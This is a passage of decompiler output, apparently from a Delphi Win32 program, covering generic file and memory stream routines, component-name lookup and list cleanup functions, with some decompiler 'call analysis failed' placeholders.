  v4 = ((__int64 (__stdcall *)(_DWORD, _DWORD))*(_DWORD *)(*(_DWORD *)a1 + 20))(0, 0);
  v3 = ((__int64 (__stdcall *)(_DWORD, _DWORD))*(_DWORD *)(*(_DWORD *)a1 + 20))(0, 0);
  (*(void (__stdcall **)(_DWORD, _DWORD))(*(_DWORD *)a1 + 20))(v4, HIDWORD(v4));
  return v3;
}

//----- (0041AB24) --------------------------------------------------------
int __userpurge sub_41AB24@<eax>(int a1@<eax>, int a2, int a3)
{
  return (*(int (__stdcall **)(int, int))(*(_DWORD *)a1 + 4))(a2, a3);
}

//----- (0041AB38) --------------------------------------------------------
#error "41AB75: call analysis failed (funcsize=27)"

//----- (0041AB8C) --------------------------------------------------------
int __cdecl sub_41AB8C(int a1)
{
  int v1; // eax
  int v3[64]; // [esp+0h] [ebp-108h] BYREF
  int *v4; // [esp+100h] [ebp-8h] BYREF
  char v5; // [esp+104h] [ebp-4h]

  sub_403484(**(_DWORD **)(a1 - 4), v3);
  v4 = v3;
  v5 = 4;
  v1 = sub_409660((int)dword_4171E0, 1, off_42BA74, 0, (int)&v4);
  return sub_403CCC(v1, v3[0], v3[1], v3[2], v3[3]);
}
// 4171E0: using guessed type int dword_4171E0[4];
// 42BA74: using guessed type int **off_42BA74;
// 41AB8C: using guessed type int var_108[64];

//----- (0041ABD8) --------------------------------------------------------
int __usercall sub_41ABD8@<eax>(int a1@<eax>, int a2@<edx>, __int16 a3@<cx>)
{
  int i; // [esp+8h] [ebp-20h] BYREF
  __int16 v6; // [esp+Eh] [ebp-1Ah]
  int v7; // [esp+10h] [ebp-18h]
  int *p_i; // [esp+14h] [ebp-14h]
  int v9; // [esp+18h] [ebp-10h]
  int v10; // [esp+1Ch] [ebp-Ch]
  int v11; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v6 = a3;
  v11 = a1;
  v10 = a1;
  v9 = *(_DWORD *)(*(_DWORD *)a1 + 20);
  for ( i = sub_40347C(a1); i && (int (**)())i != &off_417BD8; i = sub_4034C0(i) )
    ;
  if ( !i )
    sub_41AB8C((int)&savedregs);
  p_i = &i;
  v7 = *(_DWORD *)(i + 20);
  if ( v9 == v7 )
    sub_41AB8C((int)&savedregs);
  return (*(int (__stdcall **)(int, int))(*(_DWORD *)v11 + 20))(a2, a2 >> 31);
}
// 417BD8: using guessed type int (*off_417BD8)();

//----- (0041AC5C) --------------------------------------------------------
__int64 __userpurge sub_41AC5C@<edx:eax>(int a1@<eax>, unsigned __int8 a2@<dl>, __int64 a3)
{
  _DWORD *v5; // eax
  int v7; // [esp+0h] [ebp-10h]
  int v8; // [esp+4h] [ebp-Ch]
  int v9; // [esp+8h] [ebp-8h]
  int v10; // [esp+Ch] [ebp-4h]

  if ( a3 < (__int64)0xFFFFFFFF80000000ui64 || a3 > 0x7FFFFFFF )
  {
    v5 = sub_409624((int)dword_407168, 1, off_42BA54[0]);
    sub_403CCC((int)v5, v7, v8, v9, v10);
  }
  return (*(int (__fastcall **)(_DWORD, _DWORD))(*(_DWORD *)a1 + 16))(a2, a3);
}
// 41ACA0: variable 'v7' is possibly undefined
// 41ACA0: variable 'v8' is possibly undefined
// 41ACA0: variable 'v9' is possibly undefined
// 41ACA0: variable 'v10' is possibly undefined
// 407168: using guessed type int dword_407168[3];
// 42BA54: using guessed type int **off_42BA54[4];

//----- (0041ACCC) --------------------------------------------------------
#error "41ACFA: call analysis failed (funcsize=24)"

//----- (0041AD04) --------------------------------------------------------
#error "41AD32: call analysis failed (funcsize=24)"

//----- (0041AD3C) --------------------------------------------------------
__int64 __userpurge sub_41AD3C@<edx:eax>(int a1@<eax>, int a2@<edx>, __int64 a3)
{
  int v4; // ebx
  int v5; // esi
  unsigned int v7[2]; // [esp-Ch] [ebp-30h] BYREF
  int *v8; // [esp-4h] [ebp-28h]
  int v9; // [esp+Ch] [ebp-18h]
  int v10; // [esp+10h] [ebp-14h]
  __int64 v11; // [esp+14h] [ebp-10h]
  int v12; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v12 = a1;
  if ( !a3 )
  {
    sub_41AAC0(a2, 0, 0);
    a3 = sub_41AAD4(a2);
  }
  v11 = a3;
  if ( a3 <= 61440 )
    v10 = a3;
  else
    v10 = 61440;
  v9 = sub_4026E0(v10);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_41AE19;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  while ( a3 )
  {
    if ( v10 >= a3 )
      v4 = a3;
    else
      v4 = v10;
    v5 = v9;
    sub_41ACCC(v4, v9);
    sub_41AD04(v4, v5);
    a3 -= v4;
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_41AE20;
  sub_402700(v9);
  return v11;
}
// 41ACCC: using guessed type int __fastcall sub_41ACCC(_DWORD, _DWORD);
// 41AD04: using guessed type int __fastcall sub_41AD04(_DWORD, _DWORD);

//----- (0041AE30) --------------------------------------------------------
_DWORD *__usercall sub_41AE30@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  unsigned int v6[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v7; // [esp-4h] [ebp-10h]
  _DWORD *v8; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v8 = sub_41B2D8((int)&off_417F20, 1, a1, 4096);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_41AE80;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_41E204(v8, a2, a3);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_41AE87;
  return sub_403534(v8);
}
// 417F20: using guessed type int (*off_417F20)();

//----- (0041AE8C) --------------------------------------------------------
_DWORD *__usercall sub_41AE8C@<eax>(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  int v3; // esi
  char v4; // bl
  _DWORD *v5; // edi
  char v7; // [esp-10h] [ebp-1Ch]

  if ( a2 )
    a1 = (_DWORD *)sub_403864((int)a1, a2, v7);
  v3 = a3;
  v4 = a2;
  v5 = a1;
  sub_403504(a1, 0);
  v5[1] = v3;
  if ( v4 )
    sub_4038BC(v5);
  return v5;
}
// 41AE96: variable 'v7' is possibly undefined
// 41AE9B: variable 'a3' is possibly undefined
// 41AE9D: variable 'a2' is possibly undefined

//----- (0041AEC8) --------------------------------------------------------
DWORD __usercall sub_41AEC8@<eax>(int a1@<eax>, void *a2@<edx>, DWORD a3@<ecx>)
{
  DWORD result; // eax

  result = sub_407D60(a3, a2, *(void **)(a1 + 4));
  if ( result == -1 )
    return 0;
  return result;
}

//----- (0041AED8) --------------------------------------------------------
DWORD __usercall sub_41AED8@<eax>(int a1@<eax>, const void *a2@<edx>, DWORD a3@<ecx>)
{
  DWORD result; // eax

  result = sub_407D8C(a3, a2, *(void **)(a1 + 4));
  if ( result == -1 )
    return 0;
  return result;
}

//----- (0041AEE8) --------------------------------------------------------
DWORD __userpurge sub_41AEE8@<eax>(int a1@<eax>, char a2@<dl>, LONG a3, LONG a4)
{
  return sub_407DB8(*(void **)(a1 + 4), a2 & 0x7F, a3, a4);
}

//----- (0041AF14) --------------------------------------------------------
int __usercall sub_41AF14@<eax>(int a1@<eax>, int a2@<edx>)
{
  return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)a1 + 4))(a1, a2, a2 >> 31);
}

//----- (0041AF28) --------------------------------------------------------
int __userpurge sub_41AF28@<eax>(HANDLE *a1@<eax>, int a2, int a3)
{
  int v4; // eax

  (*((void (__stdcall **)(int, int))*a1 + 5))(a2, a3);
  v4 = SetEndOfFile_0(a1[1]);
  return sub_40A638(v4);
}

//----- (0041AF50) --------------------------------------------------------
_DWORD *__userpurge sub_41AF50@<eax>(int a1@<eax>, char a2@<dl>, char *a3@<ecx>, __int16 a4)
{
  char v4; // bl
  _DWORD *v5; // esi
  char v7; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = sub_403864(a1, a2, v7);
  v4 = a2;
  v5 = (_DWORD *)a1;
  sub_41AF94(a1, 0, a3, 0, a4);
  if ( v4 )
    sub_4038BC(v5);
  return v5;
}
// 41AF5C: variable 'v7' is possibly undefined
// 41AF61: variable 'a2' is possibly undefined
// 41AF70: variable 'a3' is possibly undefined

//----- (0041AF94) --------------------------------------------------------
_DWORD *__userpurge sub_41AF94@<eax>(int a1@<eax>, char a2@<dl>, char *a3@<ecx>, int a4, __int16 a5)
{
  int v5; // esi
  _DWORD *v6; // ebx
  HANDLE v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v12; // [esp-10h] [ebp-28h]
  int v13; // [esp-Ch] [ebp-24h]
  int v14; // [esp-8h] [ebp-20h]
  int v15; // [esp-4h] [ebp-1Ch]
  int v16; // [esp+Ch] [ebp-Ch] BYREF
  char v17; // [esp+10h] [ebp-8h]
  char v18; // [esp+17h] [ebp-1h]

  if ( a2 )
    a1 = sub_403864(a1, a2, v12);
  v5 = (int)a3;
  v18 = a2;
  v6 = (_DWORD *)a1;
  if ( a5 == -1 )
  {
    v7 = sub_407D58(a3);
    sub_41AE8C(v6, 0, (int)v7);
    if ( (int)v6[1] < 0 )
    {
      v16 = v5;
      v17 = 11;
      v8 = sub_409660((int)dword_41723C, 1, off_42BA04, 0, (int)&v16);
      sub_403CCC(v8, v12, v13, v14, v15);
    }
  }
  else
  {
    v9 = sub_407CD8(a3, a5);
    sub_41AE8C(v6, 0, v9);
    if ( (int)v6[1] < 0 )
    {
      v16 = v5;
      v17 = 11;
      v10 = sub_409660((int)dword_417298, 1, off_42BA14[0], 0, (int)&v16);
      sub_403CCC(v10, v12, v13, v14, v15);
    }
  }
  if ( v18 )
    sub_4038BC(v6);
  return v6;
}
// 41AFA4: variable 'v12' is possibly undefined
// 41AFA9: variable 'a3' is possibly undefined
// 41AFAB: variable 'a2' is possibly undefined
// 41AFF4: variable 'v13' is possibly undefined
// 41AFF4: variable 'v14' is possibly undefined
// 41AFF4: variable 'v15' is possibly undefined
// 41723C: using guessed type int dword_41723C[4];
// 417298: using guessed type int dword_417298[3];
// 42BA04: using guessed type int **off_42BA04;
// 42BA14: using guessed type int **off_42BA14[5];

//----- (0041B05C) --------------------------------------------------------
_DWORD *__usercall sub_41B05C@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  void *v6; // eax
  _DWORD *result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  v6 = (void *)v2[1];
  if ( (int)v6 >= 0 )
    sub_407DF0(v6);
  result = sub_403524(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_4038B4(v5);
  return result;
}
// 41B063: variable 'v3' is possibly undefined

//----- (0041B090) --------------------------------------------------------
int __usercall sub_41B090@<eax>(int result@<eax>, int a2@<edx>, int a3@<ecx>)
{
  *(_DWORD *)(result + 4) = a2;
  *(_DWORD *)(result + 8) = a3;
  return result;
}

//----- (0041B098) --------------------------------------------------------
int __usercall sub_41B098@<eax>(_DWORD *a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  int v4; // edi
  int v5; // esi

  v4 = a1[3];
  if ( v4 < 0 )
    return 0;
  if ( a3 < 0 )
    return 0;
  v5 = a1[2] - v4;
  if ( v5 <= 0 )
    return 0;
  if ( a3 < v5 )
    v5 = a3;
  sub_402844((char *)(v4 + a1[1]), a2, v5);
  a1[3] += v5;
  return v5;
}

//----- (0041B0D0) --------------------------------------------------------
int __usercall sub_41B0D0@<eax>(int a1@<eax>, int a2@<edx>, __int16 a3@<cx>)
{
  bool v3; // cf
  __int16 v4; // cx

  v3 = a3 == 0;
  v4 = a3 - 1;
  if ( v3 )
  {
    *(_DWORD *)(a1 + 12) = a2;
  }
  else if ( v4 )
  {
    if ( v4 == 1 )
      *(_DWORD *)(a1 + 12) = *(_DWORD *)(a1 + 8) + a2;
  }
  else
  {
    *(_DWORD *)(a1 + 12) += a2;
  }
  return *(_DWORD *)(a1 + 12);
}

//----- (0041B0F4) --------------------------------------------------------
int __usercall sub_41B0F4@<eax>(int result@<eax>)
{
  int v1; // ecx

  v1 = *(_DWORD *)(result + 8);
  if ( v1 )
    return sub_41AD04(v1, *(_DWORD *)(result + 4));
  return result;
}
// 41AD04: using guessed type int __fastcall sub_41AD04(_DWORD, _DWORD);

//----- (0041B10C) --------------------------------------------------------
_DWORD *__usercall sub_41B10C@<eax>(int a1@<eax>, char *a2@<edx>)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  _DWORD *v6; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v6 = sub_41AF50((int)&off_417CC0, 1, a2, 0xFFFF);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_41B157;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_41B0F4(a1);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_41B15E;
  return sub_403534(v6);
}
// 417CC0: using guessed type int (*off_417CC0)();

//----- (0041B164) --------------------------------------------------------
_DWORD *__usercall sub_41B164@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  int *v2; // eax
  char v3; // dl
  char v4; // bl
  int *v5; // esi
  _DWORD *result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_41B190(v2);
  result = sub_403524(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_4038B4(v5);
  return result;
}
// 41B16B: variable 'v3' is possibly undefined

//----- (0041B190) --------------------------------------------------------
int __usercall sub_41B190@<eax>(int *a1@<eax>)
{
  int result; // eax

  sub_41B1A8(a1);
  a1[2] = 0;
  result = 0;
  a1[3] = 0;
  return result;
}

//----- (0041B1A8) --------------------------------------------------------
int __usercall sub_41B1A8@<eax>(int *a1@<eax>)
{
  int v2; // eax
  int result; // eax
  int v4; // [esp+0h] [ebp-8h]

  v2 = (*(int (**)(void))(*a1 + 28))();
  sub_41B090((int)a1, v2, a1[2]);
  result = v4;
  a1[4] = v4;
  return result;
}

//----- (0041B1D0) --------------------------------------------------------
int __usercall sub_41B1D0@<eax>(int *a1@<eax>, int a2@<edx>)
{
  int v4; // edi
  int result; // eax
  int v6; // ecx

  v4 = a1[3];
  result = sub_41B1A8(a1);
  a1[2] = a2;
  if ( a2 < v4 )
  {
    LOWORD(v6) = 2;
    return (*(int (__fastcall **)(int, _DWORD))(*a1 + 16))(v6, 0);
  }
  return result;
}
// 41B1F4: variable 'v6' is possibly undefined

//----- (0041B1FC) --------------------------------------------------------
#error "41B27A: call analysis failed (funcsize=50)"

//----- (0041B288) --------------------------------------------------------
int __usercall sub_41B288@<eax>(int *a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  int v6; // eax
  int v7; // edi

  v6 = a1[3];
  if ( v6 < 0 )
    return 0;
  if ( a3 < 0 )
    return 0;
  v7 = a3 + v6;
  if ( a3 + v6 <= 0 )
    return 0;
  if ( v7 > a1[2] )
  {
    if ( v7 > a1[4] )
      sub_41B1A8(a1);
    a1[2] = v7;
  }
  sub_402844(a2, (char *)(a1[3] + a1[1]), a3);
  a1[3] = v7;
  return a3;
}

//----- (0041B2D8) --------------------------------------------------------
_DWORD *__userpurge sub_41B2D8@<eax>(int a1@<eax>, char a2@<dl>, int a3@<ecx>, int a4)
{
  char v4; // bl
  _DWORD *v5; // edi
  char v7; // [esp-10h] [ebp-1Ch]

  if ( a2 )
    a1 = sub_403864(a1, a2, v7);
  v4 = a2;
  v5 = (_DWORD *)a1;
  *(_DWORD *)(a1 + 4) = a3;
  *(_DWORD *)(a1 + 8) = sub_4026E0(a4);
  v5[3] = a4;
  if ( v4 )
    sub_4038BC(v5);
  return v5;
}
// 41B2E5: variable 'v7' is possibly undefined
// 41B2EA: variable 'a2' is possibly undefined
// 41B2F1: variable 'a3' is possibly undefined

//----- (0041B320) --------------------------------------------------------
int __usercall sub_41B320@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  int result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  result = v2[2];
  if ( result )
    result = sub_402700(result);
  if ( v4 > 0 )
    return sub_4038B4(v5);
  return result;
}
// 41B327: variable 'v3' is possibly undefined

//----- (0041B348) --------------------------------------------------------
int __usercall sub_41B348@<eax>(int result@<eax>, int a2@<edx>)
{
  *(_DWORD *)(result + 24) = a2;
  return result;
}

//----- (0041B424) --------------------------------------------------------
int __userpurge sub_41B424@<eax>(int a1@<eax>, char a2@<dl>, int a3@<ecx>, __int32 a4, __int32 a5, int a6, int a7)
{
  char v7; // bl
  int v8; // esi
  char v10; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = sub_403864(a1, a2, v10);
  v7 = a2;
  v8 = a1;
  *(_DWORD *)(a1 + 4) = a3;
  *(_DWORD *)(a1 + 8) = a7;
  *(_DWORD *)(a1 + 12) = a6;
  sub_4042C0((volatile __int32 *)(a1 + 16), a5);
  sub_4042C0((volatile __int32 *)(v8 + 20), a4);
  if ( v7 )
    sub_4038BC((_DWORD *)v8);
  return v8;
}
// 41B430: variable 'v10' is possibly undefined
// 41B435: variable 'a2' is possibly undefined
// 41B439: variable 'a3' is possibly undefined

//----- (0041B47C) --------------------------------------------------------
char __usercall sub_41B47C@<al>(int a1@<eax>)
{
  char result; // al
  _BYTE *v3; // esi
  _BYTE *i; // ebx

  result = 0;
  v3 = *(_BYTE **)(a1 + 20);
  for ( i = v3; *i && *i != 46; ++i )
    ;
  if ( *i )
  {
    sub_40435C((char **)(a1 + 16), *(char **)(a1 + 20), i - v3);
    sub_4047BC((char **)(a1 + 20), 1, i - v3 + 1);
    return 1;
  }
  return result;
}

//----- (0041B4D4) --------------------------------------------------------
_DWORD *__usercall sub_41B4D4@<eax>(int a1@<eax>, int *a2@<edx>)
{
  _DWORD *v4; // eax
  _DWORD *v6; // [esp-18h] [ebp-1Ch]
  unsigned int v7[2]; // [esp-14h] [ebp-18h] BYREF
  int *v8; // [esp-Ch] [ebp-10h]
  int v9; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v9 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_41B54B;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_405F40(&v9);
  if ( a2 )
  {
    v6 = (_DWORD *)(sub_4163BC(***(_DWORD ***)(a1 + 12)) + 5);
    v4 = sub_405F40(&v9);
    if ( !(unsigned __int8)sub_40AD80(a2, v6, v4) )
      sub_405F40(&v9);
  }
  sub_417090(*(_DWORD **)(a1 + 4), *(_DWORD *)(a1 + 12), v9);
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_41B552;
  return sub_405F40(&v9);
}

//----- (0041B558) --------------------------------------------------------
int __usercall sub_41B558@<eax>(int a1@<eax>, char *a2@<edx>)
{
  char *v2; // ebx
  char *v4; // eax
  int v5; // esi
  unsigned int v7[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v8; // [esp-4h] [ebp-18h]
  char *v9; // [esp+Ch] [ebp-8h] BYREF
  int v10; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v9 = 0;
  v2 = a2;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_41B5FE;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v10 = 0;
  if ( a2 )
  {
    while ( *v2 )
    {
      v4 = v2;
      while ( *v2 && (unsigned __int8)(*v2 - 45) >= 2u )
        ++v2;
      sub_40435C(&v9, v4, v2 - v4);
      v5 = sub_41FF6C(a1, v9);
      if ( !v5 && sub_407ACC(v9, "Owner") )
        v5 = a1;
      if ( !v5 )
        goto LABEL_20;
      if ( *v2 == 46 )
        ++v2;
      if ( *v2 == 45 )
        ++v2;
      if ( *v2 == 62 )
        ++v2;
      a1 = v5;
    }
    v10 = a1;
  }
LABEL_20:
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_41B605;
  sub_40426C(&v9);
  return v10;
}

//----- (0041B620) --------------------------------------------------------
void __usercall sub_41B620(int a1@<eax>, _BYTE *a2@<edx>)
{
  _DWORD *v2; // edi
  int v3; // ebx
  int v4; // eax
  _DWORD *v5; // esi
  unsigned int v6[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v7; // [esp-4h] [ebp-18h]
  _BYTE *v8; // [esp+Ch] [ebp-8h]
  int v9; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v8 = a2;
  v9 = a1;
  if ( dword_42CBD4 )
  {
    v2 = (_DWORD *)sub_418F84(dword_42CBD4);
    v7 = &savedregs;
    v6[1] = (unsigned int)&loc_41B6BB;
    v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v6);
    v3 = v2[2] - 1;
    if ( v3 >= 0 )
    {
      do
      {
        v4 = sub_418C80((int)v2, v3);
        v5 = (_DWORD *)v4;
        if ( (!v9 || *(_DWORD *)(v4 + 8) == v9) && (!v8 || sub_407ACC(v8, *(_BYTE **)(v4 + 16))) )
        {
          sub_418B90(v2, v3);
          sub_403534(v5);
        }
        --v3;
      }
      while ( v3 != -1 );
    }
    __writefsdword(0, v6[0]);
    v7 = (int *)&loc_41B6C2;
    sub_418FE8(dword_42CBD4);
  }
}
// 42CBD4: using guessed type int dword_42CBD4;

//----- (0041B6CC) --------------------------------------------------------
void __usercall sub_41B6CC(int a1@<eax>)
{
  _DWORD *v1; // edi
  int v2; // ebx
  _DWORD *v3; // esi
  unsigned int v4[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v5; // [esp-4h] [ebp-14h]
  int v6; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v6 = a1;
  if ( dword_42CBD4 )
  {
    v1 = (_DWORD *)sub_418F84(dword_42CBD4);
    v5 = &savedregs;
    v4[1] = (unsigned int)&loc_41B743;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    v2 = v1[2] - 1;
    if ( v2 >= 0 )
    {
      do
      {
        v3 = (_DWORD *)sub_418C80((int)v1, v2);
        if ( v3[1] == v6 )
        {
          sub_418B90(v1, v2);
          sub_403534(v3);
        }
        --v2;
      }
      while ( v2 != -1 );
    }
    __writefsdword(0, v4[0]);
    v5 = (int *)&loc_41B74A;
    sub_418FE8(dword_42CBD4);
  }
}
// 42CBD4: using guessed type int dword_42CBD4;

//----- (0041B750) --------------------------------------------------------
#error "41B761: call analysis failed (funcsize=9)"

//----- (0041B768) --------------------------------------------------------
int sub_41B768()
{
  return sub_41B750();
}
// 41B750: using guessed type int sub_41B750(void);

//----- (0041B774) --------------------------------------------------------
#error "41B797: call analysis failed (funcsize=16)"

//----- (0041B7A0) --------------------------------------------------------
int __usercall sub_41B7A0@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  int v6; // ecx
  int result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  LOWORD(v6) = 1;
  (*(void (__fastcall **)(int, int))(*(_DWORD *)v2[1] + 16))(v6, v2[4] - v2[5]);
  result = sub_41B320(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return sub_4038B4(v5);
  return result;
}
// 41B7A8: variable 'v3' is possibly undefined
// 41B7BB: variable 'v6' is possibly undefined

//----- (0041B7DC) --------------------------------------------------------
int __usercall sub_41B7DC@<eax>(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  int result; // eax
  int v6; // ecx

  result = sub_41D0FC(a1, a3);
  if ( a2 != (_BYTE)result )
  {
    --a1[4];
    sub_41D20C(a1, v6);
    return sub_41B768();
  }
  return result;
}
// 41B7F2: variable 'v6' is possibly undefined

//----- (0041B800) --------------------------------------------------------
char __userpurge sub_41B800@<al>(int a1@<eax>, _BYTE *a2@<edx>, int a3, int a4, void (*a5)(void), int a6)
{
  char result; // al

  result = sub_407ACC(a2, *(_BYTE **)(a1 + 112));
  if ( result )
  {
    if ( HIWORD(a5) )
    {
      a5();
      return (unsigned __int8)sub_40426C((_DWORD *)(a1 + 112));
    }
  }
  return result;
}

//----- (0041B834) --------------------------------------------------------
char __userpurge sub_41B834@<al>(int a1@<eax>, _BYTE *a2@<edx>, int a3, int a4, void (*a5)(void), int a6)
{
  char result; // al
  int v7; // ecx
  int v8; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v10; // [esp-8h] [ebp-18h]
  int *v11; // [esp-4h] [ebp-14h]
  void *v12; // [esp+0h] [ebp-10h]
  unsigned int v13; // [esp+4h] [ebp-Ch] BYREF
  void (__stdcall ***v14)(struct _EXCEPTION_REGISTRATION_RECORD *); // [esp+8h] [ebp-8h]
  _DWORD *v15; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v15 = (_DWORD *)a1;
  result = sub_407ACC(a2, *(_BYTE **)(a1 + 112));
  if ( result && HIWORD(a5) )
  {
    if ( (unsigned __int8)sub_41D0FC(v15, v7) != 10 )
    {
      --v15[4];
      sub_41D20C(v15, v8);
      *((_BYTE *)v15 + 120) = 1;
      sub_41B768();
    }
    v14 = (void (__stdcall ***)(struct _EXCEPTION_REGISTRATION_RECORD *))sub_403504(&off_417DB0, 1);
    v11 = &savedregs;
    v10 = &loc_41B8F4;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    sub_41BC78(v15, (char *)&v13, 4u);
    (**v14)(ExceptionList);
    sub_41BC78(v15, (char *)v14[1], v13);
    *((_BYTE *)v15 + 120) = 1;
    a5();
    __writefsdword(0, (unsigned int)v10);
    v12 = &loc_41B8FB;
    sub_403534(v14);
    return (unsigned __int8)sub_40426C(v15 + 28);
  }
  return result;
}
// 41B863: variable 'v7' is possibly undefined
// 41B875: variable 'v8' is possibly undefined
// 417DB0: using guessed type int (*off_417DB0)();

//----- (0041B910) --------------------------------------------------------
bool __usercall sub_41B910@<al>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  bool result; // al

  result = (unsigned __int8)sub_41D0FC(a1, a2) == 0;
  --a1[4];
  return result;
}

//----- (0041B924) --------------------------------------------------------
__int64 __usercall sub_41B924@<edx:eax>(__int64 result@<edx:eax>, int a2@<ecx>)
{
  int v2; // [esp+4h] [ebp-8h] BYREF

  v2 = a2;
  LOBYTE(v2) = 0;
  if ( *(_WORD *)(result + 90) )
    LODWORD(result) = (*(int (__fastcall **)(_DWORD, _DWORD, int *))(result + 88))(HIDWORD(result), result, &v2);
  LOBYTE(result) = v2;
  HIDWORD(result) = v2;
  return result;
}

//----- (0041B944) --------------------------------------------------------
int *__usercall sub_41B944@<eax>(int a1@<eax>, int *a2@<edx>, char *a3@<ecx>)
{
  int *v7; // [esp+8h] [ebp-114h] BYREF
  char v8[4]; // [esp+Ch] [ebp-110h] BYREF
  char v9[268]; // [esp+10h] [ebp-10Ch] BYREF

  sub_404500(v9, a3, 255);
  v7 = sub_403784(*a2, v9);
  v8[0] = v7 == 0;
  if ( *(_WORD *)(a1 + 58) )
    (*(void (__fastcall **)(char *, int, char *, int **))(a1 + 56))(a3, a1, v8, &v7);
  if ( v8[0] )
    sub_41B768();
  return v7;
}
// 41B944: using guessed type char var_110[4];

//----- (0041B9AC) --------------------------------------------------------
void __usercall sub_41B9AC(int a1@<eax>)
{
  _DWORD *v2; // esi
  int v3; // ebx
  _DWORD *v4; // eax
  unsigned int v5[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v6; // [esp-4h] [ebp-10h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v2 = (_DWORD *)sub_418F84(dword_42CBD4);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_41BA1C;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v3 = v2[2] - 1;
  if ( v3 >= 0 )
  {
    do
    {
      v4 = (_DWORD *)sub_418C80((int)v2, v3);
      if ( v4[1] == *(_DWORD *)(a1 + 4) && v4[3] == *(_DWORD *)(a1 + 12) )
      {
        sub_403534(v4);
        sub_418B90(v2, v3);
      }
      --v3;
    }
    while ( v3 != -1 );
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_41BA23;
  sub_418FE8(dword_42CBD4);
}
// 42CBD4: using guessed type int dword_42CBD4;

//----- (0041BA28) --------------------------------------------------------
_DWORD *__usercall sub_41BA28@<eax>(int *a1@<eax>)
{
  int v1; // eax
  int v2; // eax
  int v3; // esi
  int v4; // ebx
  int v5; // edi
  int v6; // eax
  int v7; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v9; // [esp-18h] [ebp-30h] BYREF
  void *v10; // [esp-14h] [ebp-2Ch]
  int *v11; // [esp-10h] [ebp-28h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v13; // [esp-8h] [ebp-20h]
